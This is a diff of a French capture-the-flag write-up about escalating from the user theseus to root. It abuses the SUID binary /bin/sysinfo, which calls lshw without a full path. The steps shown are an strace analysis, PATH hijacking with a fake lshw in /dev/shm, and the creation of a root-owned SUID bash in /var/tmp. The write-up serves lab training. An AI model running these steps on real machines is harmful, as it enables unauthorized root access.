@@ -1205,17 +1205,33 @@ uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
 
 Il est donc autorisé à exécuter `/bin/sysinfo`. Grâce au bit SUID, le programme utilise alors les privilèges effectifs de son propriétaire, c’est-à-dire `root`.
 
-### Analyse du fonctionnement de `/bin/sysinfo`
+### Analyse du fonctionnement de /bin/sysinfo avec strace
 
-Le simple fait qu’un programme soit SUID ne suffit pas nécessairement à l’exploiter. Il faut d’abord comprendre son fonctionnement et identifier les commandes externes qu’il exécute.
+Tu passes ensuite à une analyse dynamique de `/bin/sysinfo` avec `strace`.
 
-L’outil `strace` permet d’observer les appels à `execve` réalisés par le programme et ses processus enfants :
+Pour commencer, tu exécutes le binaire en enregistrant une trace complète dans un fichier temporaire :
 
 ```bash
-strace -f -e execve /bin/sysinfo 2>&1
+strace -f -o /tmp/sysinfo.strace /bin/sysinfo 2>/dev/null
 ```
 
-La sortie montre que `/bin/sysinfo` lance plusieurs commandes par l’intermédiaire de `/bin/sh -c` :
+L’option `-f` est importante, car `/bin/sysinfo` lance plusieurs processus enfants. Sans elle, les commandes exécutées par ces sous-processus pourraient ne pas apparaître dans la trace.
+
+L’option `-o` permet d’enregistrer la sortie dans un fichier, ce qui facilite ensuite les recherches.
+
+La redirection suivante masque les éventuels messages d’erreur affichés pendant l’exécution :
+
+```bash
+2>/dev/null
+```
+
+Tu recherches ensuite les appels `execve`, qui correspondent aux programmes exécutés :
+
+```bash
+grep -n "execve(" /tmp/sysinfo.strace
+```
+
+La sortie montre que `/bin/sysinfo` lance `/bin/sh` afin d’exécuter plusieurs commandes système :
 
 ```bash
 execve("/bin/sh", ["sh", "-c", "lshw -short"], ...)
@@ -1224,23 +1240,39 @@ execve("/bin/sh", ["sh", "-c", "cat /proc/cpuinfo"], ...)
 execve("/bin/sh", ["sh", "-c", "free -h"], ...)
 ```
 
-Le programme exécute donc notamment la commande suivante :
+Le point intéressant est que certaines commandes, notamment `lshw`, sont appelées sans chemin absolu :
 
 ```bash
 lshw -short
 ```
 
-Le chemin absolu du programme `lshw` n’est pas précisé. Une implémentation plus sûre aurait utilisé :
+Le programme n’exécute donc pas directement :
 
 ```bash
 /usr/bin/lshw -short
 ```
 
-En l’absence de chemin absolu, le shell recherche le programme `lshw` dans les différents répertoires définis par la variable d’environnement `PATH`, en respectant leur ordre.
+Tu filtres alors la trace sur le mot-clé `lshw` :
 
-Il devient alors possible de placer un faux programme nommé `lshw` dans un répertoire contrôlé par `theseus`, puis de placer ce répertoire au début du `PATH`.
+```bash
+grep -n "lshw" /tmp/sysinfo.strace
+```
 
-Cette faiblesse permet un détournement du `PATH`.
+La trace montre que le shell recherche le programme `lshw` dans les différents répertoires définis par la variable d’environnement `PATH`, jusqu’à trouver le véritable binaire.
+
+```bash
+72:2143  execve("/bin/sh", ["sh", "-c", "lshw -short"], 0x7ffd86a86ac8 /* 18 vars */ <unfinished ...>
+116:2143  stat("/usr/local/sbin/lshw", 0x7ffe3095d670) = -1 ENOENT (No such file or directory)
+117:2143  stat("/usr/local/bin/lshw", 0x7ffe3095d670) = -1 ENOENT (No such file or directory)
+118:2143  stat("/usr/sbin/lshw", 0x7ffe3095d670) = -1 ENOENT (No such file or directory)
+119:2143  stat("/usr/bin/lshw", {st_mode=S_IFREG|0755, st_size=687056, ...}) = 0
+122:2144  execve("/usr/bin/lshw", ["lshw", "-short"], 0x562f4b0b9b68 /* 18 vars */) = 0
+
+```
+
+Cette résolution via le `PATH` constitue la faiblesse exploitable. Comme `/bin/sysinfo` est un binaire SUID appartenant à `root`, tu peux tenter de placer un faux programme nommé `lshw` dans un répertoire contrôlé, puis placer ce répertoire en tête du `PATH`.
+
+Le faux `lshw` sera alors exécuté à la place du programme légitime, avec les privilèges effectifs de `root`.
 
 ### Confirmation de l’exécution avec les privilèges de root
 
@@ -1287,11 +1319,39 @@ root
 
 Le détournement du `PATH` est donc exploitable.
 
-### Création d’un Bash SUID
+### Création d’un Bash SUID dans `/var/tmp`
 
-La preuve de concept peut maintenant être remplacée par une charge utile permettant d’obtenir durablement un shell privilégié.
+Le faux programme `lshw` est maintenant modifié afin de créer une copie SUID de Bash.
 
-Le faux programme `lshw` est ensuite modifié afin de créer une copie SUID de Bash dans `/var/tmp` :
+Le répertoire `/dev/shm` reste adapté pour héberger le faux `lshw`, car `theseus` peut y créer et exécuter des fichiers. En revanche, il ne convient pas pour stocker le Bash SUID : sur cette machine, `/dev/shm` est monté avec l’option `nosuid`.
+
+```bash
+mount | grep /dev/shm
+```
+
+La sortie montre que ce système de fichiers est monté avec l’option `nosuid` :
+
+```bash
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+```
+
+Cette option demande au noyau d’ignorer les bits SUID et SGID présents sur les fichiers de ce système de fichiers. Une copie de Bash placée dans `/dev/shm` conserve donc visuellement le bit SUID dans ses permissions, mais celui-ci n’est pas appliqué lors de l’exécution.
+
+Tu vérifies ensuite que `/var/tmp` n’est pas monté séparément avec cette option :
+
+```bash
+mount | grep -E ' /var/tmp | /var '
+```
+
+donne :
+
+```bash
+/dev/sda1 on /var/tmp type ext4 (rw,relatime,errors=remount-ro)
+```
+
+Aucune option `nosuid` ne concerne `/var/tmp`. Ce répertoire peut donc être utilisé pour stocker la copie SUID de Bash, tandis que `/dev/shm` reste utilisé pour héberger le faux programme `lshw`.
+
+Le faux `lshw` devient alors :
 
 ```bash
 cat > /dev/shm/lshw << 'EOF'
@@ -1309,31 +1369,17 @@ chmod +x /dev/shm/lshw
 PATH=/dev/shm:$PATH /bin/sysinfo
 ```
 
-Le fichier créé peut être vérifié avec :
+La copie de Bash créée dans `/var/tmp` peut ensuite être vérifiée :
 
 ```bash
 ls -l /var/tmp/bashroot
 ```
 
-La sortie confirme que la copie appartient à `root` et possède le bit SUID :
+La sortie confirme qu’elle appartient à `root` et qu’elle possède le bit SUID :
 
 ```text
 -rwsr-xr-x 1 root root 1113504 Jul 10 01:40 /var/tmp/bashroot
 ```
-
-Le Bash SUID est ensuite lancé avec l’option `-p` :
-
-```bash
-/var/tmp/bashroot -p
-```
-
-Cette option demande à Bash de conserver ses privilèges effectifs. La commande `id` confirme alors que l’UID réel reste celui de `theseus`, tandis que l’UID effectif devient celui de `root` :
-
-```text
-uid=1000(theseus) gid=1000(theseus) euid=0(root) groups=1000(theseus),100(users)
-```
-
-Le shell dispose donc des privilèges nécessaires pour accéder au répertoire `/root` et lire le fichier `root.txt`.
 
 ### Lecture de root.txt
 
